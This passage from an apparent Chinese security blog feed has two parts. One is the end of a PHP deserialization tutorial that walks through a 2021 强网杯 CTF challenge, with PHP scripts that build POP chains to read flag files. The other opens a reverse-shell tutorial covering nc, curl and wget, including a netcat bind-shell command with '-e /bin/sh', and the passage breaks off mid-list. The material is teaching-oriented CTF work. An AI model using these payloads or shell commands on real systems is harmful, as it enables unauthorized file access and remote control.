class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>; <span class="comment">//构造php为协议获取flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;source=<span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125; <span class="comment">//1.将用到的类写出形成框架并表明类的属性（变量）</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Modifier</span>(); <span class="comment">//将用到的类实例化，用到几次实例化几次</span></span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;str=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;p= <span class="variable">$d</span>;    <span class="comment">//根据pop链将对象串联起来</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));  <span class="comment">//序列化头并url编码（在这个题中有protected修饰的属性，会有不可见字符）</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="2021-强网杯-赌徒"><a class="markdownIt-Anchor" href="#2021-强网杯-赌徒">#</a> 2021 强网杯 赌徒</h5><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">_sayhello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Get_hint</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  <span class="title class_">Start</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>尾部可以看到 <code>Room</code>  类中有个 <code>Get_hint()</code>  方法，里面有一个 <code>file_get_contents</code> ，可以实现任意文件读取，我们就可以利用这个读取 flag 文件了，然后就是往前倒推， <code>Room</code>  类中 <code>__invoke()</code>  方法调用了 <code>Get_hint()</code> ，然后 <code>Room</code>  类的 <code>__get()</code>  里面有个 <code>return $function()</code>  可以调用 <code>__invoke()</code> ，再往前看， <code>Info</code>  类中的 <code>__toString()</code>  中有 <code>Room</code>  类中不存在的属性，所以可以调用 <code>__get()</code> ，然后 <code>Start</code>  类中有个 <code>_sayhello()</code>  可以调用 <code>__toString()</code> ，然后在 <code>Start</code>  类中 <code>__wakeup()</code>  方法中直接调用了 <code>_sayhello()</code> ，而我们知道的是，输入字符串之后就会先进入 <code>__wakeup()</code></p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">头 -&gt; Start::__wakeup() -&gt; Start::_sayhello() -&gt; Info::__toString() -&gt; Room::__get() -&gt; Room::invoke() -&gt; Room::Get_hint() </span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title class_">Room</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt; file[<span class="string">&#x27;filename&#x27;</span>] = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span> -&gt; a = <span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>在构建 pop 链时，除 <code>__construct</code>  函数一般不需要写出，   变量的权限与源码保持一致，在串联对象时，需要与源码的对应关系保持一致，比如： <code>$b -&gt; file['filename'] = $c;</code></p><p>————END————</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php-unserialize&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#php-unserialize&quot;&gt;#&lt;/a&gt; PHP Unserialize&lt;/h1&gt;
&lt;h2 id=&quot;什么是序列化和反序列化&quot;&gt;&lt;a class=&quot;mark</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Reverse shell</title>
    <link href="http://example.com/2024/04/09/Reverse-shell/"/>
    <id>http://example.com/2024/04/09/Reverse-shell/</id>
    <published>2024-04-09T04:29:05.000Z</published>
    <updated>2024-04-11T03:47:13.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell">#</a> 反弹 shell</h1><h2 id="反弹shell-2"><a class="markdownIt-Anchor" href="#反弹shell-2">#</a> 反弹 shell</h2><h3 id="linux环境下常用网络工具"><a class="markdownIt-Anchor" href="#linux环境下常用网络工具">#</a> linux 环境下常用网络工具</h3><h4 id="ncnetcat"><a class="markdownIt-Anchor" href="#ncnetcat">#</a> nc(netcat)</h4><p>参数说明</p><pre><code>nc.exe -h 即可看到各参数的使用方法。基本格式：nc [-options] hostname port[s] [ports] ...nc -l -p port [options] [hostname] [port]-d          后台模式-e          程序重定向，一旦连接，就执行 [危险!!]-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。-h          帮助信息-i secs     延时的间隔-l          监听模式，用于入站连接 (监听本地端口)-L          连接关闭后,仍然继续监听-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port     本地端口号 (指定本地端口 )-r          随机本地及远程端口-s addr     本地源地址-t          使用TELNET交互方式(用telnet来回应 )-u          UDP模式-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息-w secs     timeout的时间-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。</code></pre><p>连接远程主机</p><p>​ <code>nc -nvv Target_ip Target_port</code></p><p>监听本地主机</p><p>​ <code>nc -l -p Local_port</code></p><p>端口扫描</p><p>​ <code>nc -v Target_ip Target_port #可指定范围</code></p><p>端口监听</p><p>​ <code>nc -l -p Local_port</code></p><p>远程文件传输</p><p>​ <code>nc Target_ip Target_port &lt; Target_File</code></p><p>模拟 HTTP headers</p><pre><code>[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browserHTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]echo -n &quot;GET / HTTP/1.0&quot;r&quot;n&quot;r&quot;n&quot; | nc host.example.com 80连接到主机并执行</code></pre><p>正向 shell，反向 shell</p><h4 id="curl"><a class="markdownIt-Anchor" href="#curl">#</a> curl</h4><p>HTTP 命令行工具，支持文件的上传和下载，是综合传输工具</p><p>发送 GET 请求</p><p>​ <code>curl URL?a=1&amp;b=nihao</code></p><p>发送 POST 请求</p><p>​ <code>curl -X POST -d 'a=1&amp;b=nihao' URL</code></p><p>发送 json 格式请求</p><p>​ <code>curl -H &quot;Content-type: application?json&quot; -X POST -d '&#123;&quot;abc&quot;:123.&quot;bcd&quot;:&quot;nihao&quot;&#125;' URL</code></p><p>​ <code>curl -H &quot;Content-Type: application/json&quot; -X POST -d @test.json URL</code></p><h5 id="1-下载option-o或者option-o"><a class="markdownIt-Anchor" href="#1-下载option-o或者option-o">#</a> 1、下载 (option:-o 或者 option:-O)</h5><p>1.1、下载页面：</p><p><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</code> <br># 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来<br> <code>curl -O http://www.linux.com/dodo1.JPG</code></p><p>1.2：循环下载<br>有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来<br> <code>curl -O http://www.linux.com/dodo[1-5].JPG</code></p><p>1.3：下载重命名<br>在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖<br> <code>curl -o #1_#2.JPG http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。<br> <code>curl -O http://www.linux.com/&#123;hello,bb&#125;/dodo[1-5].JPG</code></p><p>1.4：分块下载 (option：-r)</p><p><code>curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG</code> <br> <code>cat dodo1_part* &gt; dodo1.JPG </code></p><p>#这样就可以查看 dodo1.JPG 的内容了</p><p>1.5：通过 ftp（文件传输协议）下载文件 (option：-u)<br> curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法<br> <code>curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG</code> <br> <code>curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG</code></p><p>1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)<br> <code>curl -# -O http://www.linux.com/dodo1.JPG  </code> <br> <code>curl -s -O http://www.linux.com/dodo1.JPG</code></p><p>1.7、下载，断点续传 (-C <offset>)<br> 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；<br> <code>curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso</code> <br> <code>curl -C -O http://www.linux.com/dodo1.JPG</code></offset></p><h5 id="2-上传文件option-t"><a class="markdownIt-Anchor" href="#2-上传文件option-t">#</a> 2、上传文件 (option:-T)</h5><p><code>curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/</code></p><h5 id="3-伪造来源页面伪造referer盗链-option-e"><a class="markdownIt-Anchor" href="#3-伪造来源页面伪造referer盗链-option-e">#</a> 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)</h5><p>很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了<br> #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的<br> <code>curl -e &quot;www.linux.com&quot; http://mail.linux.com</code> <br># 告诉爱 E 族，我是从百度来的<br> <code>curl -e http://baidu.com http://aiezu.com</code></p><h5 id="4-伪造代理设备模仿浏览器"><a class="markdownIt-Anchor" href="#4-伪造代理设备模仿浏览器">#</a> 4、伪造代理设备 (模仿浏览器)</h5><p>有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站<br> <code>curl -A &quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&quot; http://www.linux.com</code> <br># 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）<br> <code>curl -A &quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&quot; http://aiezu.com</code> <br># 告诉爱 E 族，我用的是微信内置浏览器<br> <code>curl -A &quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&quot; http://aiezu.com</code></p><h5 id="5-设置http请求"><a class="markdownIt-Anchor" href="#5-设置http请求">#</a> 5、设置 http 请求</h5><p>5.1、设置 http 请求头 (或 option:-H 或 option:–head)<br> <code>curl -H &quot;Cache-Control:no-cache&quot;  http://aiezu.com</code></p><p>5.2、指定 proxy 服务器以及其端口 (option::-x)<br># 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理<br> <code>curl -x 192.168.100.100:1080 http://www.linux.com</code></p><h5 id="6-http响应头"><a class="markdownIt-Anchor" href="#6-http响应头">#</a> 6、http 响应头</h5><p>6.1、查看 http 响应头 (option:-I)<br># 看看本站的 http 头是怎么样的<br> <code>curl -I  http://aiezu.com</code> <br> 输出：<br>HTTP/1.1 200 OK<br>Date: Fri, 25 Nov 2016 16:45:49 GMT<br>Server: Apache<br>Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/<br>Expires: Thu, 19 Nov 1981 08:52:00 GMT<br>Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0<br>Pragma: no-cache<br>Vary: Accept-Encoding<br>Content-Type: text/html; charset=utf-8</p><p>6.2、保存 http 的 response 里面的 header 信息 (option:-D)<br> <code>curl -D cookied.txt http://www.linux.com</code> <br> 执行后 cookie 信息就被存到了 cookied.txt 里面了<br>注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。</p><h5 id="7-发送表单数据"><a class="markdownIt-Anchor" href="#7-发送表单数据">#</a> 7、发送表单数据</h5><p><code>curl -F &quot;pic=@logo.png&quot; -F &quot;site=aiezu&quot;  http://aiezu.com/</code></p><h5 id="8-cookie"><a class="markdownIt-Anchor" href="#8-cookie">#</a> 8、cookie</h5><p>8.1、发送 cookie (option:-b）<br># 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie<br> <code>curl -b &quot;domain=aiezu.com&quot;  http://aiezu.com</code> <br># 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b<br> <code>curl -b cookiec.txt http://www.linux.com</code></p><p>8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）<br>执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了<br> <code>curl -c cookiec.txt  http://www.linux.com</code></p><h4 id="wget"><a class="markdownIt-Anchor" href="#wget">#</a> wget</h4><p>wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。</p><p><code>wget URL</code></p><h5 id="与curl区别"><a class="markdownIt-Anchor" href="#与curl区别">#</a> 与 curl 区别</h5><p>wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。</p><h4 id="ping"><a class="markdownIt-Anchor" href="#ping">#</a> ping</h4><p>ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。</p><h4 id="talent"><a class="markdownIt-Anchor" href="#talent">#</a> talent</h4><p>telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。</p><p>open : 使用 openhostname 可以建立到主机的 Telnet 连接。</p><p>close : 使用命令 close 命令可以关闭现有的 Telnet 连接。</p><p>display : 使用 display 命令可以查看 Telnet 客户端的当前设置。</p><p>send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：</p><p>ao : 放弃输出命令。</p><p>ayt : “Are you there” 命令。</p><p>esc : 发送当前的转义字符。</p><p>ip : 中断进程命令。</p><p>synch : 执行 Telnet 同步操作。</p><p>brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。</p><h4 id="ssh"><a class="markdownIt-Anchor" href="#ssh">#</a> ssh</h4><p>简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。</p><h3 id="正向shell如何连接"><a class="markdownIt-Anchor" href="#正向shell如何连接">#</a> 正向 shell 如何连接</h3><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p><p>目标主机： <code>nc -lvp Target_port -e /bin/sh</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png" alt="image.png"></p><p>本地主机：  <code>nc Target_ip Target_port</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png" alt="image.png"></p><h3 id="什么是反弹shell"><a class="markdownIt-Anchor" href="#什么是反弹shell">#</a> 什么是反弹 shell</h3><p>参考：<a class="link" href="https://xz.aliyun.com/t/9488">https://xz.aliyun.com/t/9488 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。</p><p>举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？</p><p>有如下情况：</p><p>1. 